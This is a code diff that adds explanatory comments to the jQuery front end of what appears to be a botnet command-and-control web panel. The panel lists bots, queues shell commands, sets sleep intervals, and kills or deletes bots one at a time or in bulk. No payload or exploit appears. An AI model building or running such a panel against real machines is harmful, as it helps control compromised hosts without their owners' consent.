@@ -1,3 +1,4 @@
+// gets the csrf token and sets the X-CSRFToken header so WTF CSRF will be happy
 function csrf(){
     var csrftoken = $('meta[name=csrf-token]').attr('content');
     $.ajaxSetup({
@@ -9,6 +10,7 @@ function csrf(){
     });
 }
 
+// queries the /api/clients/list endpoint for json data about bots
 function clients_list(){
     $.ajax({
         url: '/api/clients/list',
@@ -41,6 +43,7 @@ function clients_list(){
     });
 }
 
+// returns the symbol name for the detected OS (font awesome)
 function get_symbol(bot){
     var symbol = "fa-question";
     if (bot.OS){
@@ -60,6 +63,7 @@ function get_symbol(bot){
     return symbol;
 }
 
+// sets the data in the single bot modal. Is set on popup and every second when the modal is up
 function set_modal_data(i, bot){
     var q = "";
     $.each(bot.cmd_queue, function(j, cmd){
@@ -86,6 +90,7 @@ function modal_tabs(e) {
     }
 }
 
+// Submits sleep or commands to api
 function submit_to_api(e){
     var target = $(".tab-pane.active")[0].id;
     var endp = "";
@@ -115,6 +120,7 @@ function submit_to_api(e){
     });
 }
 
+// get request to delete bot
 function delete_bot(e){
     $.ajax({
         url: '/api/clients/delete/' + $('#botid').val(),
@@ -125,6 +131,7 @@ function delete_bot(e){
     });
 }
 
+// get request to kill bot
 function kill_bot(e){
     $.ajax({
         url: '/api/clients/kill/' + $('#botid').val(),
@@ -135,6 +142,7 @@ function kill_bot(e){
     });
 }
 
+// get request to clear the bot's queue
 function clearq_bot(e){
     $.ajax({
         url: '/api/clients/clearq/' + $('#botid').val(),
@@ -149,12 +157,14 @@ function clearq_bot(e){
     });
 }
 
+// selects all checkboxes when the top checkbox is checked
 function select_all_checkboxes(e){
     $('input:checkbox[name="botcb"]').each(function(){
         $(this).prop("checked", $('input:checkbox[name="allbot"]').prop("checked"));
     });
 }
 
+// run a get request for each checked bot to delete them
 function delete_all_checked(e){
     if (!confirm("Are you sure you want to delete all checked bots?")){
         return;
@@ -167,6 +177,7 @@ function delete_all_checked(e){
     });
 }
 
+// run a get request for each checked bot to kill them
 function kill_all_checked(e){
     if (!confirm("Are you sure you want to kill all checked bots?")){
         return;
@@ -179,6 +190,7 @@ function kill_all_checked(e){
     });
 }
 
+// run a get request for each checked bot to clear their queues
 function clearq_all_checked(e){
     if (!confirm("Are you sure you want to clear the command queue of all checked bots?")){
         return;
@@ -191,6 +203,7 @@ function clearq_all_checked(e){
     });
 }
 
+// run a get request for each checked bot to run a command on all of them
 function command_all_checked(e){
     var cmd = prompt("What command would you like to run?");
     $('input:checkbox[name="botcb"]:checked').each(function(){
@@ -204,6 +217,7 @@ function command_all_checked(e){
     });
 }
 
+// run a get request for each checked bot to set the sleep time on all of them
 function sleep_all_checked(e){
     var interval = prompt("What do you want to set the sleep interval to?");
     $('input:checkbox[name="botcb"]:checked').each(function(){
@@ -220,6 +234,7 @@ function sleep_all_checked(e){
     });
 }
 
+// allows submission of modal data (sleep/command) by pressing enter key
 function submit_on_enter(e){
     if(e.keyCode == 13){
         $("#submit-btn").click();
